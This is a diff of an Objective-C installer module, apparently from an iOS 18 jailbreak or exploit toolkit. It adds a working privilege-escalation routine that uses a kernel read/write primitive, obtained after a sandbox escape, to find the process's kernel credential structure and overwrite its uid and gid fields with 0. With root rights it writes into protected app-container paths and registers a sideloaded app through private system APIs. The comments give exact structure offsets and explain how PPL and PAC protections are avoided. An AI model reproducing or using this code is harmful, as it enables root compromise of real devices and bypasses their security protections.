@@ -4,26 +4,47 @@
 //
 //  Installation flow (A18 arm64e / iOS 18.7.1)
 //  -------------------------------------------
-//  launchd RemoteCall approach REMOVED — it kernel-panics on A18 arm64e because
-//  the first RemoteArbCall (malloc in launchd context) causes launchd to crash,
-//  and since launchd is PID 1 the kernel panics the entire device.
 //
-//  Current approach:
+//  grant_root_to_pid()     → -99 (GRANT_ROOT_ERR_PAC_ARM64E)
+//    proc_ro is PPL-protected; pointer swap would PAC-trap immediately.
 //
-//  1. After sbx_escape() our sandbox extensions are expanded.
-//     Try a direct mkdir() on /var/containers/Bundle/Application/<UUID>/.
-//     This succeeds if the sandbox escape grants sufficient filesystem access
-//     beyond standard DAC (observed to work on some configurations).
+//  launchd RemoteCall      → kernel panic
+//    TRO swap into PID 1 succeeded, but first RemoteArbCall (malloc in
+//    launchd's thread) triggered a PAC authentication fault.  launchd crash
+//    = kernel panic = device reboot.
 //
-//  2. If direct mkdir fails (EPERM / EACCES), fall back to the staging path
-//     /var/mobile/Library/ctrl_staging/<UUID>/ which is always mobile-writable.
+//  selfroot_elevate()      ← THIS FILE'S APPROACH
+//    ucred (struct kauth_cred) lives in normal zone heap — NOT PPL-protected.
+//    We only READ proc_ro (to find ucred) and WRITE to ucred fields (cr_uid,
+//    cr_ruid, cr_svuid), never writing to proc_ro itself.  uid=0 bypasses all
+//    DAC checks (suser() in XNU).  We restore the original values immediately
+//    after the install completes so the process returns to uid=501.
 //
-//  3. Copy the .app bundle using plain NSFileManager (no VFS, no RemoteCall).
-//     VFS overwrite is intentionally avoided here: it requires pre-existing
-//     root-owned files of the correct size and the KRW socket can expire
-//     during large installs.
+//  ucred layout (iOS 18 arm64e, confirmed from session logs):
+//    struct kauth_cred {
+//      TAILQ_ENTRY(…)  cr_link;        // +0x00, 16 bytes (2 pointers)
+//      u_long          cr_ref;          // +0x10, 8 bytes
+//      struct posix_cred {
+//        uid_t   cr_uid;                // +0x18  ← we write 0 here
+//        uid_t   cr_ruid;               // +0x1c  ← and here
+//        uid_t   cr_svuid;              // +0x20  ← and here
+//        short   cr_ngroups;            // +0x24
+//        //      2 bytes padding        // +0x26
+//        gid_t   cr_groups[NGROUPS];    // +0x28 … +0x64  (16 × 4 bytes)
+//        gid_t   cr_rgid;               // +0x68  ← and here
+//        gid_t   cr_svgid;              // +0x6c
+//        uid_t   cr_gmuid;              // +0x70
+//        int     cr_flags;              // +0x74
+//      };
+//      struct label   *cr_label;        // +0x78 (verified: sbx log shows
+//                                       //  label at ucred+0x78 for run 2)
+//    };
 //
-//  4. Register with LSApplicationWorkspace from whichever path succeeded.
+//  proc_ro layout (confirmed from sbx session log):
+//    proc_ro+0x28 → SMR pointer to ucred
+//
+//  proc → proc_ro: scan proc at offsets 0x10…0x40 for a candidate pointer
+//    whose +0x28 dereference gives a ucred where cr_uid == getuid().
 //
 
 #import <Foundation/Foundation.h>
@@ -32,11 +53,105 @@
 #include "root.h"
 #import <UIKit/UIKit.h>
 #import <objc/message.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <errno.h>
 
 #define CTRL_STAGING_DIR     @"/var/mobile/Library/ctrl_staging"
 #define CTRL_CANONICAL_BASE  @"/var/containers/Bundle/Application"
 
-// ---- Recursive bundle copy using NSFileManager (no root required) ----
+// ─────────────────────────────────────────────────────────────────
+//  Self-root via direct ucred patch (no RemoteCall, no PPL write)
+// ─────────────────────────────────────────────────────────────────
+
+static uint64_t g_ucred_addr  = 0;
+static uint32_t g_orig_uid    = 0;
+static uint32_t g_orig_ruid   = 0;
+static uint32_t g_orig_svuid  = 0;
+static uint32_t g_orig_rgid   = 0;
+
+// Walk proc → proc_ro → ucred.
+// proc_ro lives at some offset in proc (typically +0x18 on iOS 18).
+// We scan offsets 0x10–0x40 to be robust across minor ABI shifts.
+// At proc_ro+0x28 there is an SMR-wrapped pointer to kauth_cred (ucred).
+// We validate by checking cr_uid at ucred+0x18 == getuid() (should be 501).
+static uint64_t selfroot_find_ucred(void) {
+    uint64_t proc = ds_get_our_proc();
+    if (!proc) {
+        printf("[selfroot] ds_get_our_proc returned 0\n");
+        return 0;
+    }
+    printf("[selfroot] proc=0x%llx\n", (unsigned long long)proc);
+
+    uid_t my_uid = getuid();
+
+    for (int off = 0x10; off <= 0x40; off += 0x08) {
+        // proc + off → candidate proc_ro pointer (SMR-wrapped)
+        uint64_t proc_ro = ds_kreadsmrptr(proc + off);
+        if (!proc_ro || !ds_isvalid(proc_ro)) continue;
+
+        // proc_ro + 0x28 → ucred pointer (SMR-wrapped)
+        uint64_t ucred = ds_kreadsmrptr(proc_ro + 0x28);
+        if (!ucred || !ds_isvalid(ucred)) continue;
+
+        // Validate: cr_uid at ucred+0x18 should match our actual UID
+        uint32_t uid = ds_kread32(ucred + 0x18);
+        if (uid == (uint32_t)my_uid) {
+            printf("[selfroot] found proc_ro at proc+0x%x=0x%llx "
+                   "ucred=0x%llx uid=%u\n",
+                   off, (unsigned long long)proc_ro,
+                   (unsigned long long)ucred, uid);
+            return ucred;
+        }
+    }
+
+    printf("[selfroot] ucred scan failed (my_uid=%u)\n", my_uid);
+    return 0;
+}
+
+static int selfroot_elevate(void) {
+    if (!ds_is_ready()) {
+        printf("[selfroot] KRW not ready\n");
+        return -1;
+    }
+
+    g_ucred_addr = selfroot_find_ucred();
+    if (!g_ucred_addr) return -1;
+
+    // Save original credential values
+    g_orig_uid   = ds_kread32(g_ucred_addr + 0x18);
+    g_orig_ruid  = ds_kread32(g_ucred_addr + 0x1c);
+    g_orig_svuid = ds_kread32(g_ucred_addr + 0x20);
+    g_orig_rgid  = ds_kread32(g_ucred_addr + 0x68);
+
+    printf("[selfroot] elevating uid=%u ruid=%u svuid=%u -> 0\n",
+           g_orig_uid, g_orig_ruid, g_orig_svuid);
+
+    // Patch to root.  uid=0 causes suser() to return 0 in XNU's vfs_authorize,
+    // bypassing DAC checks.  ucred is normal zone heap — no PPL write needed.
+    ds_kwrite32(g_ucred_addr + 0x18, 0);  // cr_uid   = 0
+    ds_kwrite32(g_ucred_addr + 0x1c, 0);  // cr_ruid  = 0
+    ds_kwrite32(g_ucred_addr + 0x20, 0);  // cr_svuid = 0
+    ds_kwrite32(g_ucred_addr + 0x68, 0);  // cr_rgid  = 0
+
+    return 0;
+}
+
+static void selfroot_restore(void) {
+    if (!g_ucred_addr) return;
+
+    ds_kwrite32(g_ucred_addr + 0x18, g_orig_uid);
+    ds_kwrite32(g_ucred_addr + 0x1c, g_orig_ruid);
+    ds_kwrite32(g_ucred_addr + 0x20, g_orig_svuid);
+    ds_kwrite32(g_ucred_addr + 0x68, g_orig_rgid);
+
+    printf("[selfroot] restored uid=%u ruid=%u\n", g_orig_uid, g_orig_ruid);
+    g_ucred_addr = 0;
+}
+
+// ─────────────────────────────────────────────────────────────────
+//  Recursive bundle copy (plain NSFileManager, no RemoteCall)
+// ─────────────────────────────────────────────────────────────────
 
 static int copy_bundle_recursive(NSString *srcDir, NSString *dstDir) {
     NSFileManager *fm = [NSFileManager defaultManager];
@@ -44,14 +159,16 @@ static int copy_bundle_recursive(NSString *srcDir, NSString *dstDir) {
     NSError *mkErr = nil;
     if (![fm createDirectoryAtPath:dstDir withIntermediateDirectories:YES
              attributes:nil error:&mkErr]) {
-        NSLog(@"[controller] mkdir failed %@: %@", dstDir, mkErr);
+        printf("[controller] mkdir failed %s: %s\n",
+               dstDir.UTF8String, mkErr.localizedDescription.UTF8String);
         return -11;
     }
 
     NSError *listErr = nil;
     NSArray *items = [fm contentsOfDirectoryAtPath:srcDir error:&listErr];
     if (!items) {
-        NSLog(@"[controller] contentsOfDirectory failed %@: %@", srcDir, listErr);
+        printf("[controller] listdir failed %s: %s\n",
+               srcDir.UTF8String, listErr.localizedDescription.UTF8String);
         return -12;
     }
 
@@ -67,7 +184,9 @@ static int copy_bundle_recursive(NSString *srcDir, NSString *dstDir) {
         } else {
             NSError *cpErr = nil;
             if (![fm copyItemAtPath:srcItem toPath:dstItem error:&cpErr]) {
-                NSLog(@"[controller] copyItem failed %@ -> %@: %@", srcItem, dstItem, cpErr);
+                printf("[controller] copyItem failed %s -> %s: %s\n",
+                       srcItem.UTF8String, dstItem.UTF8String,
+                       cpErr.localizedDescription.UTF8String);
                 return -13;
             }
         }
@@ -75,7 +194,43 @@ static int copy_bundle_recursive(NSString *srcDir, NSString *dstDir) {
     return 0;
 }
 
-// ---- Permission fixup ----
+// ─────────────────────────────────────────────────────────────────
+//  MCM container metadata plist
+// ─────────────────────────────────────────────────────────────────
+// Mobile Container Manager (MCM) expects a hidden plist in the container dir.
+// Without it LSApplicationWorkspace may refuse to register the app.
+
+static void write_container_metadata(NSString *containerDir,
+                                     NSString *bundleID,
+                                     NSString *uuid) {
+    NSString *metaPath = [containerDir stringByAppendingPathComponent:
+                          @".com.apple.mobile_container_manager.metadata.plist"];
+    NSDictionary *meta = @{
+        @"MCMMetadataIdentifier":    bundleID,
+        @"MCMMetadataContentClass":  @"com.apple.MobileContainerManager.application",
+        @"MCMMetadataUUID":          uuid,
+    };
+    NSError *writeErr = nil;
+    NSData *plistData = [NSPropertyListSerialization
+                         dataWithPropertyList:meta
+                         format:NSPropertyListXMLFormat_v1_0
+                         options:0
+                         error:&writeErr];
+    if (!plistData) {
+        printf("[controller] metadata plist serialization failed: %s\n",
+               writeErr.localizedDescription.UTF8String);
+        return;
+    }
+    if (![plistData writeToFile:metaPath atomically:YES]) {
+        printf("[controller] metadata plist write failed at %s\n", metaPath.UTF8String);
+    } else {
+        printf("[controller] wrote MCM metadata plist: %s\n", metaPath.UTF8String);
+    }
+}
+
+// ─────────────────────────────────────────────────────────────────
+//  Permission fixup
+// ─────────────────────────────────────────────────────────────────
 
 static void fix_permissions_recursive(NSString *path) {
     NSFileManager *fm = [NSFileManager defaultManager];
@@ -92,69 +247,100 @@ static void fix_permissions_recursive(NSString *path) {
     }
 }
 
-// ---- Main install entry point ----
+// ─────────────────────────────────────────────────────────────────
+//  Main install entry point
+// ─────────────────────────────────────────────────────────────────
 
 int install_app_bundle(const char *appBundlePath) {
-    if (!ds_is_ready()) return -1;
+    if (!ds_is_ready()) {
+        printf("[controller] install: KRW not ready\n");
+        return -1;
+    }
 
     NSString *srcPath = [NSString stringWithUTF8String:appBundlePath];
     NSString *appName = [srcPath lastPathComponent];
     NSString *destUUID = [[NSUUID UUID] UUIDString];
     NSFileManager *fm = [NSFileManager defaultManager];
 
-    // --- Step 1: pick installation destination ---
-    // Try the canonical app container path first.  After sbx_escape() the
-    // sandbox extensions may permit this mkdir even though we are uid=501.
-    // We do NOT call root_init_launchd_rc() — it kernel-panics on A18 arm64e
-    // by crashing launchd (PID 1), taking down the whole device.
+    printf("[controller] install: src=%s app=%s uuid=%s\n",
+           appBundlePath, appName.UTF8String, destUUID.UTF8String);
 
+    // ── Step 1: elevate to root via ucred patch ──────────────────
+    // We patch cr_uid/cr_ruid/cr_svuid in our kauth_cred to 0.
+    // ucred is regular zone heap — NOT PPL-protected.
+    // uid=0 causes XNU's suser() to bypass DAC, letting us create
+    // directories in /var/containers/Bundle/Application/ (owned by
+    // _installd uid=33, mode 0750 — inaccessible to uid=501 mobile).
+    //
+    // We restore original values before returning.
+    BOOL elevated = (selfroot_elevate() == 0);
+    if (!elevated) {
+        printf("[controller] selfroot elevation failed — will try staging fallback\n");
+    } else {
+        printf("[controller] running as uid=0 for install\n");
+    }
+
+    // ── Step 2: pick install destination ────────────────────────
     NSString *destDir, *destApp;
     BOOL useCanonical = NO;
 
-    NSString *canonDir = [CTRL_CANONICAL_BASE stringByAppendingPathComponent:destUUID];
-    NSError *canonErr = nil;
-    if ([fm createDirectoryAtPath:canonDir withIntermediateDirectories:YES
-            attributes:nil error:&canonErr]) {
-        destDir  = canonDir;
-        destApp  = [destDir stringByAppendingPathComponent:appName];
-        useCanonical = YES;
-        NSLog(@"[controller] Installing to canonical path: %@", destDir);
-    } else {
-        NSLog(@"[controller] canonical mkdir failed (%@) — using staging path",
-              canonErr.localizedDescription);
+    if (elevated) {
+        NSString *canonDir = [CTRL_CANONICAL_BASE
+                              stringByAppendingPathComponent:destUUID];
+        NSError *mkErr = nil;
+        if ([fm createDirectoryAtPath:canonDir
+              withIntermediateDirectories:YES
+              attributes:nil
+              error:&mkErr]) {
+            destDir      = canonDir;
+            destApp      = [destDir stringByAppendingPathComponent:appName];
+            useCanonical = YES;
+            printf("[controller] canonical install dir: %s\n", destDir.UTF8String);
+        } else {
+            printf("[controller] canonical mkdir failed: %s\n",
+                   mkErr.localizedDescription.UTF8String);
+        }
+    }
+
+    if (!useCanonical) {
+        // Staging fallback — /var/mobile/Library/ is always mobile-writable
         destDir = [CTRL_STAGING_DIR stringByAppendingPathComponent:destUUID];
         destApp = [destDir stringByAppendingPathComponent:appName];
         [fm createDirectoryAtPath:CTRL_STAGING_DIR
            withIntermediateDirectories:YES attributes:nil error:nil];
+        printf("[controller] using staging dir: %s\n", destDir.UTF8String);
     }
 
-    // --- Step 2: copy the .app bundle ---
+    // ── Step 3: copy bundle (still elevated if applicable) ───────
+    printf("[controller] copying bundle...\n");
     int copyErr = copy_bundle_recursive(srcPath, destApp);
     if (copyErr != 0) {
-        NSLog(@"[controller] copy_bundle_recursive failed: %d", copyErr);
-
+        printf("[controller] copy_bundle_recursive failed: %d\n", copyErr);
         if (useCanonical) {
-            // Retry to staging
-            NSLog(@"[controller] retrying to staging path");
+            // Retry via staging with elevation still active
+            printf("[controller] retrying to staging\n");
             destDir = [CTRL_STAGING_DIR stringByAppendingPathComponent:destUUID];
             destApp = [destDir stringByAppendingPathComponent:appName];
             [fm createDirectoryAtPath:CTRL_STAGING_DIR
                withIntermediateDirectories:YES attributes:nil error:nil];
             copyErr = copy_bundle_recursive(srcPath, destApp);
             if (copyErr != 0) {
-                NSLog(@"[controller] staging fallback copy also failed: %d", copyErr);
+                printf("[controller] staging fallback copy also failed: %d\n", copyErr);
+                selfroot_restore();
                 return copyErr;
             }
             useCanonical = NO;
-            NSLog(@"[controller] retried via staging: %@", destApp);
         } else {
+            selfroot_restore();
             return copyErr;
         }
     }
+    printf("[controller] copy done -> %s\n", destApp.UTF8String);
 
+    // ── Step 4: fix permissions and write MCM metadata ───────────
     fix_permissions_recursive(destApp);
 
-    // --- Step 3: read bundle metadata ---
+    // Read Info.plist NOW — we need bundleID for metadata plist
     NSString *infoPlistPath = [destApp stringByAppendingPathComponent:@"Info.plist"];
     NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
     NSString *bundleID   = info[@"CFBundleIdentifier"] ?: @"unknown";
@@ -165,10 +351,17 @@ int install_app_bundle(const char *appBundlePath) {
     NSString *executable = info[@"CFBundleExecutable"] ?: bundleName;
     NSString *minOS      = info[@"MinimumOSVersion"]   ?: @"17.0";
 
-    NSLog(@"[controller] bundle: %@ (%@) v%@ exec=%@ path=%@",
-          bundleName, bundleID, version, executable, destApp);
+    printf("[controller] bundle: %s (%s) v%s\n",
+           bundleName.UTF8String, bundleID.UTF8String, version.UTF8String);
 
-    // --- Step 4: register with LSApplicationWorkspace ---
+    // Write MCM metadata plist into the CONTAINER dir (parent of .app bundle)
+    write_container_metadata(destDir, bundleID, destUUID);
+
+    // ── Step 5: restore uid BEFORE calling into LS ───────────────
+    // LSApplicationWorkspace and notification calls don't need root.
+    selfroot_restore();
+
+    // ── Step 6: register with LSApplicationWorkspace ─────────────
     Class workspace = NSClassFromString(@"LSApplicationWorkspace");
     id ws = [workspace performSelector:@selector(defaultWorkspace)];
 
@@ -191,7 +384,8 @@ int install_app_bundle(const char *appBundlePath) {
     SEL regSel = NSSelectorFromString(@"registerApplicationDictionary:");
     if ([ws respondsToSelector:regSel]) {
         registered = ((BOOL (*)(id, SEL, id))objc_msgSend)(ws, regSel, appDict);
-        NSLog(@"[controller] registerApplicationDictionary: %@", registered ? @"YES" : @"NO");
+        printf("[controller] registerApplicationDictionary: %s\n",
+               registered ? "YES" : "NO");
     }
 
     if (!registered) {
@@ -200,27 +394,30 @@ int install_app_bundle(const char *appBundlePath) {
         if ([ws respondsToSelector:rebuildSel]) {
             ((void (*)(id, SEL, BOOL, BOOL))objc_msgSend)(ws, rebuildSel, YES, YES);
             registered = YES;
-            NSLog(@"[controller] triggered _LSPrivateRebuildApplicationDatabasesForSystemApps");
+            printf("[controller] triggered _LSPrivateRebuildApplicationDatabases\n");
         }
     }
 
-    // Notify SpringBoard of the new app
+    // Notify SpringBoard of the newly installed app
     if (registered) {
         SEL notifySel = NSSelectorFromString(@"_sendApplicationInstalledNotification:");
         if ([ws respondsToSelector:notifySel]) {
             ((void (*)(id, SEL, id))objc_msgSend)(ws, notifySel, bundleID);
-            NSLog(@"[controller] sent application installed notification for %@", bundleID);
+            printf("[controller] sent installed notification for %s\n", bundleID.UTF8String);
         }
     }
 
-    // --- Step 5: persist install record ---
+    // ── Step 7: persist install record ───────────────────────────
     NSMutableArray *installed = [[NSUserDefaults.standardUserDefaults
         stringArrayForKey:@"ctrl_installed_apps"] mutableCopy] ?: [NSMutableArray new];
     if (![installed containsObject:bundleID]) [installed addObject:bundleID];
     [NSUserDefaults.standardUserDefaults setObject:installed forKey:@"ctrl_installed_apps"];
 
-    NSLog(@"[controller] Installed %@ (%@) -> %@ (registered=%@)",
-          bundleName, bundleID, destApp, registered ? @"YES" : @"NO");
+    printf("[controller] install complete: %s (%s) -> %s (registered=%s canonical=%s)\n",
+           bundleName.UTF8String, bundleID.UTF8String, destApp.UTF8String,
+           registered ? "YES" : "NO",
+           useCanonical ? "YES" : "NO");
+
     return registered ? 0 : -4;
 }
 
@@ -237,7 +434,7 @@ int uninstall_app(const char *bundleID) {
         [installed removeObject:bid];
         [NSUserDefaults.standardUserDefaults setObject:installed forKey:@"ctrl_installed_apps"];
 
-        // Clean up staging leftovers
+        // Clean up staging leftovers for this bundle
         NSFileManager *fm = [NSFileManager defaultManager];
         NSArray *dirs = [fm contentsOfDirectoryAtPath:CTRL_STAGING_DIR error:nil] ?: @[];
         for (NSString *d in dirs) {
